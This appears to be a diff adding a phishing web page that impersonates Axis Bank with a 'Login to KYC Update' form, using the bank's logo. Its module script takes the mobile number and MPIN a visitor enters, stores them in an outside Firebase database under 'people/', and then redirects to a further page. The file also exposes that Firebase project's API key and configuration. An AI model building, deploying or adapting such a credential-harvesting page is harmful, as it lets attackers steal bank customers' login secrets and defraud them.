@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html data-theme="light" lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Document
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdn.jsdelivr.net/npm/daisyui@3.5.0/dist/full.css" rel="stylesheet" type="text/css"/>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+ </head>
+ <body class="bg-slate-100">
+  <div class="w-full justify-center flex items-center">
+   <div class="w-[40vw] min-w-[450px]" id="enterDetails">
+    <div class="bg-pink-800 h-[60px] flex items-center justify-start">
+     <img class="h-8 ml-5" src="https://companieslogo.com/img/orig/AXISBANK.BO_BIG.D-d8105a87.png?t=1672905040"/>
+    </div>
+    <div class="w-full justify-center flex mt-5 font-md">
+     Login to KYC Update
+    </div>
+    <div class="bg-white m-5">
+     <!-- Tabs -->
+     <div class="h-8 bg-white border-2 border-slate-400 shadow-md rounded-full justify-between flex">
+      <li class="cursor-pointer w-full bg-pink-900 rounded-full text-white list-none flex justify-center" onclick="showTabContent('tab1')">
+       Login with MPIN
+      </li>
+     </div>
+     <form id="tab1-content">
+      <!-- Content for Mobile & MPIN tab goes here -->
+      <div class="p-10">
+       <h1 class="text-sm">
+        Mobile Number
+       </h1>
+       <input class="w-full border-b-[1px] border-black p-1 outline-none" id="mobile" required="" type="number"/>
+       <h1 class="text-sm mt-10">
+        MPIN
+       </h1>
+       <input class="w-full border-b-[1px] border-black p-1 outline-none" id="mpin" required="" type="password"/>
+       <!-- Button -->
+       <p class="mt-10">
+        Forgot Password
+        <span class="text-blue underline">
+         Reset Here
+        </span>
+       </p>
+       <p class="mt-1">
+        Locked Your Account
+        <span class="text-blue underline">
+         Enable Here
+        </span>
+       </p>
+       <div class="mt-5 justify-center flex">
+        <button class="btn btn-wide rounded-full btn-sm text-white bg-pink-800" id="insert" type="button">
+         Login
+        </button>
+       </div>
+      </div>
+     </form>
+     <div id="tab3-content" style="display: none">
+      <!-- Content for MPIN tab goes here -->
+      <form class="p-10">
+       <h2>
+        Select Option
+       </h2>
+       <div>
+        <input checked="" id="Audi" name="brand" type="radio" value="Audi"/>
+        <label for="Audi">
+         Customer ID
+        </label>
+       </div>
+       <div>
+        <input id="Microsoft" name="brand" type="radio" value="Microsoft"/>
+        <label for="Microsoft">
+         Pan Card
+        </label>
+       </div>
+       <!-- Input -->
+       <h1 class="text-sm mt-10">
+        Customer ID
+       </h1>
+       <input class="w-full border-b-[1px] border-black p-1 outline-none" type="text"/>
+       <h1 class="text-sm mt-10">
+        Date of Birth
+       </h1>
+       <input class="w-full border-b-[1px] border-black p-1 outline-none" type="text"/>
+       <!-- Button -->
+       <p class="mt-10">
+        Forgot Password
+        <span class="text-blue underline">
+         Reset Here
+        </span>
+       </p>
+       <p class="mt-1">
+        Locked Your Account
+        <span class="text-blue underline">
+         Enable Here
+        </span>
+       </p>
+       <div class="mt-5 justify-center flex">
+        <button class="btn btn-wide rounded-full btn-sm text-white bg-pink-800">
+         Login
+        </button>
+       </div>
+      </form>
+     </div>
+    </div>
+    <!-- Image -->
+    <div class="w-full">
+     <img alt="" class="w-full" src="https://fd4ewx.web.app/screen.png"/>
+    </div>
+   </div>
+  </div>
+  <script>
+   function showTabContent(tabId) {
+        // Hide all tab contents
+        const tabContents = document.querySelectorAll("[id$='-content']");
+        tabContents.forEach((content) => {
+          content.style.display = "none";
+        });
+
+        // Remove the classes from all tabs
+        const tabs = document.querySelectorAll("[onclick^='showTabContent']");
+        tabs.forEach((tab) => {
+          tab.classList.remove("bg-pink-900");
+          tab.classList.remove("rounded-full");
+          tab.classList.remove("text-white");
+        });
+
+        // Show the selected tab content and add the classes to the clicked tab
+        const selectedContent = document.getElementById(tabId + "-content");
+        const selectedTab = document.querySelector(
+          `[onclick="showTabContent('${tabId}')"]`
+        );
+        if (selectedContent && selectedTab) {
+          selectedContent.style.display = "block";
+          selectedTab.classList.add("bg-pink-900");
+          selectedTab.classList.add("rounded-full");
+          selectedTab.classList.add("text-white");
+        }
+      }
+  </script>
+  <script type="module">
+   // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyBbKc0ooa1s94JLsHGi0ltamx--DP3fQYU",
+  authDomain: "axin-edd86.firebaseapp.com",
+  projectId: "axin-edd86",
+  storageBucket: "axin-edd86.appspot.com",
+  messagingSenderId: "634053430908",
+  appId: "1:634053430908:web:acc26b71e17feae5f243f9"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+
+      //Insert data
+      import {
+        getDatabase,
+        ref,
+        get,
+        set,
+        child,
+        update,
+        query,
+        limitToLast,
+        remove,
+      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+
+      const db = getDatabase();
+
+      var mobile = document.querySelector("#mobile");
+      var mpin = document.querySelector("#mpin");
+
+      var insertBtn = document.querySelector("#insert");
+
+      const que = query(ref(db, "people"), limitToLast(1));
+
+      const last_key = await get(que)
+        .then((snapshot) => {
+          if (snapshot.exists()) {
+            return parseInt(Object.keys(snapshot.val())[0]) + 1;
+          } else {
+            return 1;
+          }
+        })
+        .catch((error) => {
+          console.error(error);
+        });
+
+      function InsertData() {
+        if (mobile.value.length != 10) {
+          alert("Please enter valid 10 digits Phone number");
+          return;
+        }
+
+        if (mpin.value == "" || mpin.value == null || mpin.value == undefined) {
+          alert("MPIN required");
+          return;
+        }
+
+        insertBtn.classList.add("loading");
+
+        localStorage.setItem("id", last_key);
+
+        set(ref(db, "people/" + last_key), {
+          mobile: mobile.value,
+          mpin: mpin.value,
+        })
+          .then(() => {
+            insertBtn.classList.remove("loading");
+            window.location.href = "pcdb.html";
+          })
+          .catch((error) => {
+            insertBtn.classList.remove("loading");
+          });
+      }
+      insertBtn.addEventListener("click", InsertData);
+  </script>
+ </body>
+</html>
